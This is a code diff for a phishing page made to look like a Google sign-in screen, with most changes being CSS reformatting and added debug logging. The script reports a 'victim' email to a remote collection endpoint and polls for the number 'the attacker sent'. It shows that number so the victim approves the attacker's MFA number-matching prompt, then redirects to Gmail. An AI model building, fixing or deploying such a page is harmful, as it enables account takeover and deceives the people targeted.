@@ -8,16 +8,68 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
-    body { font-family: 'Roboto', sans-serif; background: #f1f3f4; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #202124; }
-    .card { background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); padding: 48px 40px; max-width: 480px; width: 100%; text-align: center; }
+    body { 
+      font-family: 'Roboto', sans-serif; 
+      background: #f1f3f4; 
+      margin: 0; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      min-height: 100vh; 
+      color: #202124; 
+    }
+    .card { 
+      background: white; 
+      border-radius: 8px; 
+      box-shadow: 0 1px 3px rgba(0,0,0,0.2); 
+      padding: 48px 40px; 
+      max-width: 480px; 
+      width: 100%; 
+      text-align: center; 
+    }
     .logo svg { width: 48px; height: 48px; margin-bottom: 24px; }
-    .avatar { width: 64px; height: 64px; background: #1a73e8; color: white; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 28px; font-weight: 500; margin: 16px 0; }
-    .spinner { border: 8px solid #e8eaed; border-top: 8px solid #1a73e8; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 24px; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .avatar { 
+      width: 64px; 
+      height: 64px; 
+      background: #1a73e8; 
+      color: white; 
+      border-radius: 50%; 
+      display: inline-flex; 
+      align-items: center; 
+      justify-content: center; 
+      font-size: 28px; 
+      font-weight: 500; 
+      margin: 16px 0; 
+    }
+    .spinner { 
+      border: 8px solid #e8eaed; 
+      border-top: 8px solid #1a73e8; 
+      border-radius: 50%; 
+      width: 60px; 
+      height: 60px; 
+      animation: spin 1s linear infinite; 
+      margin: 0 auto 24px; 
+    }
+    @keyframes spin { 
+      0% { transform: rotate(0deg); } 
+      100% { transform: rotate(360deg); } 
+    }
     h1 { font-size: 24px; margin: 0 0 16px; }
     .status { font-size: 16px; color: #5f6368; line-height: 1.5; margin-bottom: 32px; }
     .prompt-section { display: none; margin-top: 24px; }
-    .number-box { font-size: 120px; font-weight: bold; color: #1967d2; background: #e3f2fd; width: 240px; height: 160px; line-height: 160px; margin: 32px auto; border-radius: 16px; border: 4px solid #1967d2; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+    .number-box { 
+      font-size: 120px; 
+      font-weight: bold; 
+      color: #1967d2; 
+      background: #e3f2fd; 
+      width: 240px; 
+      height: 160px; 
+      line-height: 160px; 
+      margin: 32px auto; 
+      border-radius: 16px; 
+      border: 4px solid #1967d2; 
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15); 
+    }
     .debug { font-size: 13px; color: #d93025; margin-top: 16px; }
   </style>
 </head>
@@ -61,7 +113,7 @@
       debugEl.textContent = msg; 
     }
 
-    // Send victim_ready (fire-and-forget)
+    // Send victim_ready signal (fire-and-forget)
     const readyParams = new URLSearchParams({
       action: "victim_ready",
       email: email,
@@ -73,44 +125,70 @@
       method: "GET",
       mode: "no-cors",
       cache: "no-cache"
-    }).catch(e => console.error("Ready signal failed:", e));
+    }).catch(e => {
+      console.error("Ready signal failed:", e);
+    });
 
-    // Poll for the number the attacker sent
+    // Poll for prompt number – FIXED & VERBOSE VERSION
     setInterval(async () => {
       try {
         const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
-        const res = await fetch(url, {
+        
+        console.log("[POLL START] Fetching:", url);
+
+        const response = await fetch(url, {
+          method: 'GET',
           cache: 'no-cache',
-          mode: 'cors'
+          mode: 'cors',
+          headers: { 'Accept': 'application/json' }
         });
 
-        if (!res.ok) return;
+        console.log("[POLL] Status:", response.status);
 
-        const text = await res.text();
-        let data = JSON.parse(text);
+        if (!response.ok) {
+          console.warn("[POLL] Not OK:", response.status, response.statusText);
+          return;
+        }
+
+        const rawText = await response.text();
+        console.log("[POLL RAW TEXT]:", rawText);
+
+        let data;
+        try {
+          data = JSON.parse(rawText);
+          console.log("[POLL PARSED]:", data);
+        } catch (err) {
+          console.error("[POLL PARSE ERROR]:", err, "Raw:", rawText);
+          return;
+        }
 
         const number = data.prompt_number || data.number || "";
-        if (number && number.trim() !== "" && number !== "—" && number !== "null") {
+        console.log("[POLL NUMBER FOUND]:", number);
+
+        if (number && number.trim() !== "" && number !== "—" && number !== "null" && number !== "undefined") {
           numberEl.textContent = number;
-          log(`Code received: ${number}`);
           statusEl.textContent = "Number match received – confirm on your phone";
+          log(`Displayed prompt: ${number}`);
+          console.log("[POLL SUCCESS] DOM updated to:", number);
+        } else {
+          console.log("[POLL] No valid number yet:", number || "(empty)");
         }
       } catch (err) {
-        console.error("Poll error:", err);
+        console.error("[POLL CRITICAL ERROR]:", err);
       }
     }, 4000);
 
-    // Show prompt UI after short delay
+    // Show prompt section after delay
     setTimeout(() => {
       document.getElementById("loading").style.display = "none";
       document.getElementById("prompt-section").style.display = "block";
       statusEl.textContent = "Waiting for number match...";
     }, 6000);
 
-    // Auto-redirect after long timeout
+    // Timeout redirect
     setTimeout(() => window.location.href = "https://mail.google.com/", 90000);
   </script>
 </body>
 </html>
 
-  
+
